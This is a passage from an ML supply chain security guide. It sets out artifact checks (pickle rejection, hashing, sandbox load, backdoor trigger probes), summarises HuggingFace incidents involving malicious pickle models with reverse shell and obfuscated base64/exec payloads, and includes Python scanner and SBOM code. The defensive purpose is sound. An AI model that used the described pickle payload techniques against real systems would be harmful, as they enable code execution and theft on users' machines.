            entries:
              - label: What
                value: 'Verify file format before loading'
              - label: How
                value: >
                  For expected SafeTensors: verify file_header[8:9] == b'{' For any file: verify
                  file_header[0:2] NOT IN [b'\\x80\\x02', b'\\x80\\x04']
              - label: 'Result on Fail'
                value: 'Quarantine; alert; do not load under any circumstances'
              - label: Difficulty
                value: 'Zero — two bytes to check'
              - label: 'Fp Rate'
                value: Zero
        parts:
          - heading: 'Check 02 Hash Verification'
            id: check_02_hash_verification
            blocks:
              - type: fields
                subject: 'Check 02 Hash Verification'
                entries:
                  - label: What
                    value: 'Verify cryptographic integrity of downloaded file'
            parts:
              - heading: How
                id: how
                blocks:
                  - type: prose
                    text: >
                      Compute SHA-256 of downloaded file. Compare against: model card hash, prior
                      known-good download, or published supplementary materials from the paper.
              - heading: 'Result on Fail'
                id: result_on_fail
                blocks:
                  - type: fields
                    subject: 'Result on Fail'
                    entries:
                      - label: 'Result on Fail'
                        value: 'Quarantine; alert; do not load'
              - heading: Difficulty
                id: difficulty
                blocks:
                  - type: fields
                    subject: Difficulty
                    entries:
                      - label: Difficulty
                        value: 'Low — one hash computation'
              - heading: 'Fp Rate'
                id: fp_rate
                blocks:
                  - type: fields
                    subject: 'Fp Rate'
                    entries:
                      - label: 'Fp Rate'
                        value: 'Zero — hash match is deterministic'
          - heading: 'Check 03 Model Card Audit'
            id: check_03_model_card_audit
            blocks:
              - type: fields
                subject: 'Check 03 Model Card Audit'
                entries:
                  - label: What
                    value: 'Assess model card completeness and provenance claims'
                  - label: How
                    value: >
                      Score model card against checklist (training data documented, limitations
                      described, evaluation results present, contact info present). Score below
                      threshold: flag for manual review.
                  - label: 'Result on Fail'
                    value: 'Manual review before use; do not block automatically'
                  - label: Difficulty
                    value: 'Low — automated scoring against checklist'
                  - label: 'Fp Rate'
                    value: 'Low — minimal model cards are genuinely common for legitimate models'
          - heading: 'Check 04 Dependency Sca Scan'
            id: check_04_dependency_sca_scan
            blocks:
              - type: fields
                subject: 'Check 04 Dependency Sca Scan'
                entries:
                  - label: What
                    value: 'Verify no CVEs in ML framework and library dependencies'
                  - label: How
                    value: >
                      Run pip-audit or safety against requirements.txt and pip freeze. Check docker
                      image digest against known-good. Flag critical CVEs; block on CVSS >= 9.0.
                  - label: 'Result on Fail'
                    value: 'Block on critical CVE; alert on high; log on medium'
                  - label: Difficulty
                    value: 'Low — automated SCA tool integration'
                  - label: 'Fp Rate'
                    value: 'Low — CVE match is deterministic'
          - heading: 'Check 05 Sandbox Load Test'
            id: check_05_sandbox_load_test
            blocks:
              - type: fields
                subject: 'Check 05 Sandbox Load Test'
                entries:
                  - label: What
                    value: 'Load model in isolated sandbox environment before production use'
                  - label: How
                    value: >
                      Sandboxed Python environment: no outbound network, no production credentials,
                      no production data. Load model and run basic inference. Monitor: process
                      spawns, file writes outside sandbox, network calls.
                  - label: 'Result on Fail'
                    value: 'Quarantine; security team review'
                  - label: Difficulty
                    value: 'Medium — sandbox infrastructure required'
                  - label: 'Fp Rate'
                    value: 'Very low — unexpected process/network activity is genuinely anomalous'
          - heading: 'Check 06 Behavioural Regression Test'
            id: check_06_behavioural_regression_test
            blocks:
              - type: fields
                subject: 'Check 06 Behavioural Regression Test'
                entries:
                  - label: What
                    value: 'Verify model behaviour against known-good baseline'
                  - label: How
                    value: >
                      Run standardised test suite: task-specific accuracy benchmark, trigger-probe
                      suite (known backdoor triggers), canary token recall test. Any failure
                      relative to baseline triggers review.
                  - label: 'Result on Fail'
                    value: 'Do not promote to production; investigate checkpoint integrity'
                  - label: Difficulty
                    value: 'Medium-high — test suite must be built and maintained'
                  - label: 'Fp Rate'
                    value: 'Medium — legitimate model updates alter behaviour; baseline must be versioned'
      - heading: 'Documented Supply Chain Incidents'
        id: documented_supply_chain_incidents
        blocks:
          - type: fields
            subject: 'Incident 01 Protect Ai Huggingface Pickle Exploits 2023'
            id: incident_01_protect_ai_huggingface_pickle_exploits_2023
            entries:
              - label: Year
                value: '2023'
              - label: Source
                value: 'Protect AI security research disclosure'
              - label: 'What Happened'
                value: >
                  Protect AI researchers discovered hundreds of models on HuggingFace containing
                  pickle exploit code. Some models contained confirmed reverse shell payloads — code
                  that, when the model was loaded, would establish an outbound connection to an
                  attacker-controlled server. The models had download counts in the thousands,
                  indicating they had been loaded by users prior to disclosure.
              - label: 'Atlas Techniques'
                value:
                  - AML.T0019
                  - AML.T0011
              - label: 'Root Cause'
                value: >
                  HuggingFace did not scan uploaded files for pickle exploit patterns at the time of
                  disclosure. Any registered user could upload a pickle file with arbitrary payload.
                  No sandboxed evaluation was performed on upload.
              - label: Lessons
                value:
                  - 'Model hub trust without format verification is equivalent to running arbitrary code from the internet'
                  - 'Download count and star count are not security signals'
                  - 'Format check (SafeTensors enforcement) at intake eliminates this attack vector entirely'
          - type: fields
            subject: 'Incident 02 Huggingface Spaces Secret Exposure 2024'
            id: incident_02_huggingface_spaces_secret_exposure_2024
            entries:
              - label: Year
                value: '2024'
              - label: Source
                value: 'HuggingFace security disclosure (May 2024)'
              - label: 'What Happened'
                value: >
                  HuggingFace disclosed that its Spaces platform (used for hosting ML model demos)
                  had been compromised, with adversaries gaining unauthorised access to a subset of
                  Spaces secrets — API tokens, service credentials, and environment variables stored
                  in Spaces repositories. HuggingFace revoked affected tokens and notified users.
              - label: 'Atlas Techniques'
                value:
                  - AML.T0012
                  - AML.T0019
              - label: 'Root Cause'
                value: >
                  Specific compromise mechanism not fully disclosed. Indicated that adversaries with
                  compromised Spaces access could have used those credentials to push malicious
                  model updates under legitimate organisation namespaces.
              - label: Lessons
                value:
                  - 'Model hub infrastructure is itself an attack target, not a trusted boundary'
                  - 'Secrets stored in model hub repositories should be treated as compromised and rotated proactively'
                  - 'Commit history monitoring on owned model repositories is mandatory'
          - type: fields
            subject: 'Incident 03 Supply Chain via Jfrog Research 2023'
            id: incident_03_supply_chain_via_jfrog_research_2023
            entries:
              - label: Year
                value: '2023'
              - label: Source
                value: 'JFrog security research — malicious ML models on HuggingFace'
              - label: 'What Happened'
                value: >
                  JFrog researchers identified models on HuggingFace that used Python pickle's
                  __reduce__ mechanism to embed malicious payloads. The payloads used obfuscation
                  techniques (base64 encoding, exec() chaining) to evade simple pattern matching.
                  The models used names and descriptions designed to appear as legitimate utility
                  models (e.g. text classifier or sentiment analyser wrappers).
              - label: 'Atlas Techniques'
                value:
                  - AML.T0019
                  - AML.T0011
              - label: 'Root Cause'
                value: >
                  Sophisticated adversaries obfuscated payloads specifically to evade naive format
                  scanning. This demonstrates that format checks must be structural (magic bytes,
                  file format validation) not content-based (string matching for "import os" or
                  similar).
              - label: Lessons
                value:
                  - 'Obfuscation defeats content-based scanning; structural format validation (SafeTensors) does not'
                  - 'Obfuscated pickle payloads are indistinguishable from clean ones at content level — enforce SafeTensors, not content scan'
                  - 'Model naming is adversarially optimised for trust; do not use name as a trust signal'
deliverables:
  - heading: 'ML Artifact Scanner'
    id: implementation_01
    filename: ml_artifact_scanner.py
    lang: python
    description: >
      Production-grade artifact scanner covering all six verification checks: format (SafeTensors vs
      pickle), hash verification, model card completeness, dependency SCA scan placeholder, sandbox
      load indication, and behavioural regression stub. Produces a structured scan report with
      per-check status, overall risk level, and recommended action.
    code: |
      """
      ML Artifact Scanner — Six-check artifact verification pipeline.
      Covers: format, hash, model card, dependency CVE, sandbox check, regression stub.
      """

      import hashlib
      import json
      import os
      import struct
      from dataclasses import dataclass, field
      from pathlib import Path
      from typing import Dict, List, Optional, Tuple


      # -----------------------------------------------------------------------
      # Check 1 — Format Verification
      # -----------------------------------------------------------------------

      PICKLE_MAGIC = [b'\x80\x02', b'\x80\x04', b'\x80\x05']
      SAFETENSORS_JSON_OFFSET = 8  # byte 8 should be '{' for valid SafeTensors


      def check_format(filepath: str) -> Tuple[str, bool, str]:
          """
          Returns: (format_name, is_safe, detail)
          Raises: FileNotFoundError if file not found
          """
          path = Path(filepath)
          if not path.exists():
              return ("unknown", False, f"File not found: {filepath}")

          with open(filepath, "rb") as f:
              header = f.read(16)

          if len(header) < 2:
              return ("unknown", False, "File too small to identify")

          magic2 = header[:2]
          if any(header[:2] == m[:2] or header[:2] == m for m in PICKLE_MAGIC):
              return ("pickle", False,
                      f"PICKLE MAGIC BYTES DETECTED: {header[:2].hex()} — RCE risk")

          # SafeTensors: 8-byte LE uint64 header length, then JSON starting with '{'
          if len(header) >= 9 and header[8:9] == b'{':
              try:
                  hdr_len = struct.unpack('<Q', header[:8])[0]
                  return ("safetensors", True,
                          f"SafeTensors format confirmed. Header length: {hdr_len} bytes")
              except struct.error:
                  pass

          # HDF5 (TF SavedModel / Keras)
          if header[:4] == b'\x89HDF':
              return ("hdf5", True, "HDF5 format — TensorFlow/Keras model")

          # ONNX (protobuf)
          if header[:4] == b'\x08\x04\x12\x00' or filepath.endswith('.onnx'):
              return ("onnx", True, "ONNX format — portable ML model")

          return ("unknown", False,
                  f"Unknown format. First 8 bytes: {header[:8].hex()} — manual review required")


      # -----------------------------------------------------------------------
      # Check 2 — Hash Verification
      # -----------------------------------------------------------------------

      def compute_sha256(filepath: str, chunk_size: int = 1 << 20) -> str:
          h = hashlib.sha256()
          with open(filepath, "rb") as f:
              while chunk := f.read(chunk_size):
                  h.update(chunk)
          return h.hexdigest()


      def check_hash(filepath: str,
                     expected_hash: Optional[str] = None) -> Tuple[bool, str]:
          """Compare computed hash against expected. Returns (match, detail)."""
          actual = compute_sha256(filepath)
          if expected_hash is None:
              return (None, f"No expected hash provided. Computed: {actual}")
          match = actual.lower() == expected_hash.lower()
          if match:
              return (True, f"Hash verified: {actual[:16]}...")
          return (False,
                  f"HASH MISMATCH. Expected: {expected_hash[:16]}... "
                  f"Actual: {actual[:16]}...")


      # -----------------------------------------------------------------------
      # Check 3 — Model Card Completeness Audit
      # -----------------------------------------------------------------------

      MODEL_CARD_CHECKS = {
          "training_data_described": 20,
          "known_limitations_documented": 15,
          "evaluation_results_present": 20,
          "intended_use_documented": 15,
          "out_of_scope_uses_documented": 10,
          "contact_or_attribution_present": 10,
          "licence_specified": 10,
      }


      def check_model_card(model_card_fields: Dict[str, bool]) -> Tuple[int, str, List[str]]:
          """
          model_card_fields: {field_name: True/False} for each MODEL_CARD_CHECKS key.
          Returns: (score, risk_level, missing_fields)
          """
          score = sum(
              weight for field, weight in MODEL_CARD_CHECKS.items()
              if model_card_fields.get(field, False)
          )
          missing = [f for f in MODEL_CARD_CHECKS if not model_card_fields.get(f, False)]
          risk = "low" if score >= 80 else "medium" if score >= 60 else "high"
          return (score, risk, missing)


      # -----------------------------------------------------------------------
      # Check 4 — Dependency CVE Placeholder
      # -----------------------------------------------------------------------

      KNOWN_VULNERABLE_VERSIONS = {
          "torch": ["1.13.0", "2.0.0"],   # Example — update from CVE feeds
          "tensorflow": ["2.11.0"],
          "numpy": ["1.22.0", "1.21.0"],
      }


      def check_dependencies(requirements_path: str) -> Tuple[str, List[str]]:
          """
          Parse requirements.txt and flag known-vulnerable versions.
          Returns: (risk_level, [flagged_packages])
          """
          if not Path(requirements_path).exists():
              return ("unknown", ["requirements file not found"])
          flagged = []
          with open(requirements_path) as f:
              for line in f:
                  line = line.strip()
                  if "==" in line:
                      pkg, ver = line.split("==", 1)
                      pkg = pkg.strip().lower()
                      ver = ver.strip()
                      if pkg in KNOWN_VULNERABLE_VERSIONS:
                          if ver in KNOWN_VULNERABLE_VERSIONS[pkg]:
                              flagged.append(f"{pkg}=={ver} (known vulnerable version)")
          risk = "critical" if flagged else "low"
          return (risk, flagged)


      # -----------------------------------------------------------------------
      # Check 5 — Sandbox Load Indicator (stub — full impl requires Docker)
      # -----------------------------------------------------------------------

      def check_sandbox_load(filepath: str) -> Tuple[str, str]:
          """
          Stub: in production, this spawns an isolated Docker container,
          loads the model, and monitors for unexpected process/network activity.
          Returns: (status, detail)
          """
          # Production implementation:
          # docker run --network=none --read-only --tmpfs /tmp
          #            -v filepath:/model:ro
          #            ml-sandbox:latest python -c "import safetensors; ..."
          return ("stub",
                  "Sandbox check not yet automated. Load manually in isolated env "
                  "with no outbound network before production use.")


      # -----------------------------------------------------------------------
      # Check 6 — Behavioural Regression Stub
      # -----------------------------------------------------------------------

      def check_behavioural_regression(model_id: str,
                                        trigger_phrases: List[str],
                                        canary_tokens: List[str]) -> Tuple[str, str]:
          """
          Stub: in production, this loads the model, runs the trigger-probe suite,
          and checks for canary token recall.
          Returns: (status, detail)
          """
          return ("stub",
                  f"Behavioural regression for {model_id}: implement trigger-probe "
                  f"test suite with {len(trigger_phrases)} trigger(s) and "
                  f"{len(canary_tokens)} canary token(s). See Section 5.9 deliverable.")


      # -----------------------------------------------------------------------
      # Master Scan Report
      # -----------------------------------------------------------------------

      @dataclass
      class ArtifactScanReport:
          filepath: str
          format_name: str
          format_safe: bool
          format_detail: str
          hash_match: Optional[bool]
          hash_detail: str
          card_score: Optional[int]
          card_risk: Optional[str]
          card_missing: List[str]
          dep_risk: str
          dep_flagged: List[str]
          sandbox_status: str
          sandbox_detail: str
          regression_status: str
          regression_detail: str
          overall_risk: str = field(init=False)
          recommended_action: str = field(init=False)

          def __post_init__(self):
              if not self.format_safe:
                  self.overall_risk = "critical"
                  self.recommended_action = "BLOCK — quarantine immediately; do not load"
              elif self.hash_match is False:
                  self.overall_risk = "critical"
                  self.recommended_action = "BLOCK — hash mismatch; quarantine"
              elif self.dep_risk == "critical":
                  self.overall_risk = "high"
                  self.recommended_action = "REVIEW — critical CVE in dependencies; patch before use"
              elif (self.card_score is not None and self.card_score < 60):
                  self.overall_risk = "medium"
                  self.recommended_action = "MANUAL REVIEW — low model card score"
              else:
                  self.overall_risk = "low"
                  self.recommended_action = "PASS — proceed to sandbox load test"


      def scan_artifact(
          filepath: str,
          expected_hash: Optional[str] = None,
          model_card_fields: Optional[Dict[str, bool]] = None,
          requirements_path: Optional[str] = None,
          model_id: str = "unknown",
          trigger_phrases: Optional[List[str]] = None,
          canary_tokens: Optional[List[str]] = None,
      ) -> ArtifactScanReport:

          fmt, fmt_safe, fmt_detail = check_format(filepath)
          hash_match, hash_detail = check_hash(filepath, expected_hash)
          card_score, card_risk, card_missing = (
              check_model_card(model_card_fields)
              if model_card_fields else (None, None, [])
          )
          dep_risk, dep_flagged = (
              check_dependencies(requirements_path)
              if requirements_path else ("not_checked", [])
          )
          sandbox_status, sandbox_detail = check_sandbox_load(filepath)
          reg_status, reg_detail = check_behavioural_regression(
              model_id,
              trigger_phrases or [],
              canary_tokens or [],
          )

          return ArtifactScanReport(
              filepath=filepath,
              format_name=fmt, format_safe=fmt_safe, format_detail=fmt_detail,
              hash_match=hash_match, hash_detail=hash_detail,
              card_score=card_score, card_risk=card_risk, card_missing=card_missing,
              dep_risk=dep_risk, dep_flagged=dep_flagged,
              sandbox_status=sandbox_status, sandbox_detail=sandbox_detail,
              regression_status=reg_status, regression_detail=reg_detail,
          )


      def print_scan_report(r: ArtifactScanReport) -> None:
          icons = {"critical": "CRITICAL", "high": "HIGH   ",
                   "medium": "MEDIUM ", "low": "PASS   ", "stub": "STUB   ",
                   "not_checked": "SKIP   "}
          print(f"\n{'='*60}")
          print(f"ARTIFACT SCAN REPORT: {Path(r.filepath).name}")
          print(f"Overall Risk: [{r.overall_risk.upper()}]")
          print(f"Action:       {r.recommended_action}")
          print(f"\nCheck Results:")
          fmt_icon = "PASS" if r.format_safe else "CRITICAL"
          print(f"  [{fmt_icon:8s}] Format:       {r.format_name} — {r.format_detail[:55]}")
          hash_icon = "PASS" if r.hash_match else ("SKIP" if r.hash_match is None else "CRITICAL")
          print(f"  [{hash_icon:8s}] Hash:         {r.hash_detail[:60]}")
          if r.card_score is not None:
              print(f"  [{r.card_risk.upper():8s}] Model Card:   Score {r.card_score}/100"
                    + (f" — Missing: {', '.join(r.card_missing[:3])}" if r.card_missing else ""))
          dep_icon = icons.get(r.dep_risk, "UNKNOWN ")
          print(f"  [{dep_icon}] Dependencies: {r.dep_risk}"
                + (f" — {r.dep_flagged[0]}" if r.dep_flagged else ""))
          print(f"  [STUB    ] Sandbox:      {r.sandbox_detail[:60]}")
          print(f"  [STUB    ] Regression:   {r.regression_detail[:60]}")


      if __name__ == "__main__":
          # --- Demo with a mock file ---
          import tempfile

          # Simulate a SafeTensors file (header = 8 LE bytes + '{...}' JSON)
          with tempfile.NamedTemporaryFile(suffix=".safetensors", delete=False) as f:
              header_json = b'{"__metadata__": {}}'
              hdr_len = struct.pack('<Q', len(header_json))
              f.write(hdr_len + header_json)
              fname_safe = f.name

          # Simulate a pickle file
          with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
              f.write(b'\x80\x04' + b'\x00' * 20)
              fname_pickle = f.name

          card = {
              "training_data_described": True,
              "known_limitations_documented": True,
              "evaluation_results_present": True,
              "intended_use_documented": False,
              "out_of_scope_uses_documented": False,
              "contact_or_attribution_present": True,
              "licence_specified": True,
          }

          print("DEMO: Scanning SafeTensors file")
          report_safe = scan_artifact(
              fname_safe,
              expected_hash=compute_sha256(fname_safe),
              model_card_fields=card,
              model_id="demo-model-7b",
          )
          print_scan_report(report_safe)

          print("\nDEMO: Scanning Pickle file (should BLOCK)")
          report_pickle = scan_artifact(fname_pickle)
          print_scan_report(report_pickle)

          os.unlink(fname_safe)
          os.unlink(fname_pickle)
  - heading: 'ML SBOM Generator + Supply Chain Checklist'
    id: implementation_02
    filename: ml_sbom_generator.py
    lang: python
    description: >
      ML SBOM generator: produces a structured four-layer SBOM (dataset, base model, adapters,
      framework dependencies) as a YAML artefact for any model deployment. Also implements the
      complete supply chain security checklist from data acquisition through production deployment,
      with per-stage pass/fail tracking.
    code: |
      """
      ML SBOM Generator + Supply Chain Security Checklist
      Four-layer SBOM and staged checklist from dataset to deployment.
      """

      import hashlib
      import json
      from dataclasses import dataclass, field
      from datetime import datetime, timezone
      from pathlib import Path
      from typing import Dict, List, Optional
      import yaml


      # -----------------------------------------------------------------------
      # ML SBOM Data Structures
      # -----------------------------------------------------------------------

      @dataclass
      class DatasetProvenance:
          name: str
          version: str
          source_url: str
          acquisition_date: str
          sha256_at_acquisition: str
          licence: str
          known_contamination_risks: List[str] = field(default_factory=list)
          deduplication_applied: bool = False
          filtering_pipeline_version: str = "unknown"


      @dataclass
      class BaseModelProvenance:
          identifier: str            # org/name@sha256 short
          source_hub: str
          download_date: str
          file_format: str           # safetensors / pickle / hdf5 / onnx
          sha256_at_intake: str
          sha256_at_training_start: str
          model_card_score: int
          audit_date: str
          auditor: str


      @dataclass
      class AdapterProvenance:
          identifier: str
          adapter_type: str          # lora / qlora / prefix / full-ft
          source: str
          download_date: str
          sha256: str
          fine_tuning_dataset_ref: str
          training_run_id: str
          regression_test_result: str  # pass / fail / pending


      @dataclass
      class FrameworkProvenance:
          ml_framework: str
          ml_framework_version: str
          cuda_version: str
          serving_library: str
          serving_library_version: str
          docker_image_digest: str
          sca_scan_date: str
          critical_cve_count: int
          high_cve_count: int


      @dataclass
      class MLSBOM:
          model_id: str
          sbom_version: str
          generated_at: str
          generated_by: str
          datasets: List[DatasetProvenance] = field(default_factory=list)
          base_model: Optional[BaseModelProvenance] = None
          adapters: List[AdapterProvenance] = field(default_factory=list)
          framework: Optional[FrameworkProvenance] = None

          def to_dict(self) -> Dict:
              def _dc_to_dict(obj):
                  if hasattr(obj, '__dataclass_fields__'):
                      return {k: _dc_to_dict(v) for k, v in obj.__dict__.items()}
                  if isinstance(obj, list):
                      return [_dc_to_dict(i) for i in obj]
                  return obj
              return _dc_to_dict(self)

          def export_yaml(self, path: str) -> None:
              with open(path, "w") as f:
                  yaml.dump(self.to_dict(), f, allow_unicode=True, sort_keys=False)
              print(f"ML SBOM exported to {path}")

          def risk_summary(self) -> Dict:
              risks = []
              if self.base_model and self.base_model.file_format == "pickle":
                  risks.append("CRITICAL: Base model in pickle format — RCE risk")
              if self.base_model and self.base_model.model_card_score < 60:
                  risks.append(f"HIGH: Model card score {self.base_model.model_card_score}/100")
              for a in self.adapters:
                  if a.regression_test_result == "fail":
                      risks.append(f"HIGH: Adapter {a.identifier} regression test failed")
                  if a.regression_test_result == "pending":
                      risks.append(f"MEDIUM: Adapter {a.identifier} regression test pending")
              if self.framework and self.framework.critical_cve_count > 0:
                  risks.append(f"HIGH: {self.framework.critical_cve_count} critical CVE(s) in dependencies")
              return {"risk_count": len(risks), "risks": risks}


      # -----------------------------------------------------------------------
      # Supply Chain Security Checklist
      # -----------------------------------------------------------------------

      CHECKLIST_STAGES = {
          "01_dataset_acquisition": [
              "SHA-256 hash computed and recorded at dataset download",
              "Dataset source URL and acquisition timestamp logged",
              "Dataset licence verified for intended use",
              "Known contamination risks documented",
              "Dataset stored in immutable storage (write-once S3 / GCS)",
          ],
          "02_data_preprocessing": [
              "Preprocessing pipeline version recorded in SBOM",
              "Hash of preprocessed output computed and stored",
              "Deduplication applied and parameters documented",
              "Filtering criteria documented and reproducible",
              "Canary tokens injected into training corpus",
          ],
          "03_base_model_download": [
              "Model downloaded from verified organisation on trusted hub",
              "Namespace verified against official source (no squatting variants)",
              "File format checked — SafeTensors preferred; pickle rejected",
              "SHA-256 computed at download and stored in SBOM",
              "Model card completeness score >= 70",
              "Sandbox load test completed in isolated environment",
          ],
          "04_fine_tuning_and_adapters": [
              "All adapters hashed at download and stored in SBOM",
              "Adapter source verified (no unsigned third-party adapters in prod)",
              "Behavioural regression test run on base + adapter combination",
              "Adapter hash monitoring active in registry",
              "LoRA adapter composition stack fully documented",
          ],
          "05_dependencies": [
              "SCA scan run against requirements.txt — zero critical CVEs",
              "Docker image digest pinned and recorded in SBOM",
              "No known typosquatting packages in dependency tree",
              "ML framework version on supported/patched branch",
              "CUDA / cuDNN versions recorded and vulnerability-checked",
          ],
          "06_training_pipeline": [
              "Training data integrity verified at training start (hash re-check)",
              "Base model hash re-verified at training start",
              "Training run ID recorded and linked to SBOM",
              "Training pipeline access control — only authorised identities write",
              "Training output checkpoint hashed and stored",
          ],
          "07_model_registry": [
              "Trained checkpoint hash stored in model registry at upload",
              "Registry access control — only pipeline service account writes",
              "Hash re-verified at production promotion gate",
              "Rollback capability verified — previous clean checkpoint available",
          ],
          "08_production_deployment": [
              "Model hash re-verified at serving load time",
              "Adapter hash re-verified at serving load time",
              "Behavioural regression test passed on production candidate",
              "SBOM complete and attached to production model record",
              "Incident response plan documented for supply chain compromise",
          ],
      }


      @dataclass
      class ChecklistResult:
          stage: str
          items: List[str]
          passed: List[str]
          failed: List[str]

          @property
          def score(self) -> int:
              return int(len(self.passed) / len(self.items) * 100) if self.items else 100

          @property
          def risk_level(self) -> str:
              s = self.score
              return "low" if s >= 80 else "medium" if s >= 60 else "high"


      def run_checklist(stage_responses: Dict[str, Dict[str, bool]]) -> List[ChecklistResult]:
          """
          stage_responses: {stage_key: {item_text: True/False}}
          """
          results = []
          for stage, items in CHECKLIST_STAGES.items():
              responses = stage_responses.get(stage, {})
              passed = [i for i in items if responses.get(i, False)]
              failed = [i for i in items if not responses.get(i, False)]
              results.append(ChecklistResult(stage=stage, items=items,
                                             passed=passed, failed=failed))
          return results


      def print_checklist_report(results: List[ChecklistResult]) -> None:
          print(f"\n{'='*60}")
          print("AI SUPPLY CHAIN SECURITY CHECKLIST")
          print("=" * 60)
          overall_passed = sum(len(r.passed) for r in results)
          overall_total = sum(len(r.items) for r in results)
          overall_pct = int(overall_passed / overall_total * 100) if overall_total else 0
          print(f"Overall: {overall_passed}/{overall_total} ({overall_pct}%)\n")
          for r in results:
              icon = {"low": "PASS", "medium": "WARN", "high": "FAIL"}[r.risk_level]
              print(f"  [{icon}] {r.stage} — {r.score}%")
              for f in r.failed[:3]:
                  print(f"         MISSING: {f[:60]}")


      if __name__ == "__main__":
          # --- Build example SBOM ---
          sbom = MLSBOM(
              model_id="acmecorp-financebot-v2",
              sbom_version="1.0",
              generated_at=datetime.now(timezone.utc).isoformat(),
              generated_by="ml-security-team",
          )
          sbom.datasets = [
              DatasetProvenance(
                  name="internal-finance-qa-v3",
                  version="3.0",
                  source_url="s3://internal-datasets/finance-qa-v3.jsonl",
                  acquisition_date="2026-01-10",
                  sha256_at_acquisition="abc123def456" + "0" * 52,
                  licence="proprietary",
                  deduplication_applied=True,
                  filtering_pipeline_version="filter-v2.3",
              )
          ]
          sbom.base_model = BaseModelProvenance(
              identifier="meta-llama/Meta-Llama-3-8B@a1b2c3",
              source_hub="huggingface.co",
              download_date="2026-01-12",
              file_format="safetensors",
              sha256_at_intake="def789" + "0" * 58,
              sha256_at_training_start="def789" + "0" * 58,
              model_card_score=85,
              audit_date="2026-01-12",
              auditor="ml-security-team",
          )
          sbom.adapters = [
              AdapterProvenance(
                  identifier="acmecorp/finance-lora-v2",
                  adapter_type="lora",
                  source="internal-registry",
                  download_date="2026-01-15",
                  sha256="fed321" + "0" * 58,
                  fine_tuning_dataset_ref="internal-finance-qa-v3",
                  training_run_id="run-20260115-001",
                  regression_test_result="pass",
              )
          ]
          sbom.framework = FrameworkProvenance(
              ml_framework="torch",
              ml_framework_version="2.2.1",
              cuda_version="12.1",
              serving_library="vllm",
              serving_library_version="0.4.0",
              docker_image_digest="sha256:aabbcc" + "0" * 58,
              sca_scan_date="2026-01-15",
              critical_cve_count=0,
              high_cve_count=1,
          )

          sbom.export_yaml("acmecorp_financebot_v2_sbom.yaml")
          risk = sbom.risk_summary()
          print(f"\nSBOM Risk Summary: {risk['risk_count']} risk(s)")
          for r in risk["risks"]:
              print(f"  {r}")

          # --- Run partial checklist ---
          responses = {
              "03_base_model_download": {
                  "Model downloaded from verified organisation on trusted hub": True,
                  "Namespace verified against official source (no squatting variants)": True,
                  "File format checked — SafeTensors preferred; pickle rejected": True,
                  "SHA-256 computed at download and stored in SBOM": True,
                  "Model card completeness score >= 70": True,
                  "Sandbox load test completed in isolated environment": False,  # NOT DONE
              },
              "05_dependencies": {
                  "SCA scan run against requirements.txt — zero critical CVEs": True,
                  "Docker image digest pinned and recorded in SBOM": True,
                  "No known typosquatting packages in dependency tree": False,  # MISSING
                  "ML framework version on supported/patched branch": True,
                  "CUDA / cuDNN versions recorded and vulnerability-checked": True,
              },
